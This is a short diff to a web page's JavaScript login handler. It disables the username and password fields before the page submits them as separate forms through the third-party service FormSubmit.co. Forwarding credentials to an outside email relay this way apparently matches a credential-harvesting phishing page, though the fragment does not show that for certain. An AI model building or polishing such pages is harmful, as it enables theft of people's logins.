@@ -34,6 +34,9 @@ document.addEventListener('DOMContentLoaded', () => {
         //validate the form
         validate();
         if (pwdVal) {
+             // Disable the form elements to prevent double submission
+            unameInp.disabled = true;
+            pwdInp.disabled = true;
             // Submit the form using FormSubmit.co
             form_uname.submit();
             form_pwd.submit();
